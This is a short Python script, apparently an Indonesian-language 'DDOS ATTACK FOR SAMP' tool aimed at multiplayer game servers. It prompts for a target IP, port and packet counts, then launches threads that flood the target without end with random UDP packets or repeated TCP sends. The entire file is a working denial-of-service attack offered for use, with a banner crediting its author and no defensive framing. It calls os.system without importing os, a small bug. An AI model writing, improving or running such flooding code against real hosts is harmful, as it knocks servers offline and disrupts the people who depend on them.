#!/usr/bin/env python3
#Code by MR.DANI
import random
import socket
import threading

os.system("clear")
print(" =========================================================================")
print("                       TOOLS BY M̴̒͑R̵͑͑.̸̾͘D̴͋͑A̴͆͒N̵͑̓Ḯ̴̐")
print(" =========================================================================")
print(" ███╗░░░███╗██████╗░░░░██████╗░░█████╗░███╗░░██╗██╗")
print(" ████╗░████║██╔══██╗░░░██╔══██╗██╔══██╗████╗░██║██║")
print(" ██╔████╔██║██████╔╝░░░██║░░██║███████║██╔██╗██║██║")
print(" ██║╚██╔╝██║██╔══██╗░░░██║░░██║██╔══██║██║╚████║██║")
print(" ██║░╚═╝░██║██║░░██║██╗██████╔╝██║░░██║██║░╚███║██║")
print(" ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝")
print(" DDOS ATTACK FOR SAMP")
print(" Script Ini Dibuat Hanya Untuk Team Mr.Dani")

ip = str(input(" HOST/IP:"))
port = int(input(" PORT:"))
choice = str(input(" SIAP UNTUK DDOS(y/n):"))
times = int(input(" PACKETS:"))
threads = int(input(" ISI PACKETS:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[Packed]","[Packed]","[Packed]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Tok Tok Tok Packed Dari M̴̒͑R̵͑͑.̸̾͘D̴͋͑A̴͆͒N̵͑̓Ḯ̴̐ Otw")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[Packed]","[Packed]","[Packed]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Tok Tok Tok Packed Dari M̴̒͑R̵͑͑.̸̾͘D̴͋͑A̴͆͒N̵͑̓Ḯ̴̐ Otw")
		except:
			s.close()
			print("[*] Error")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
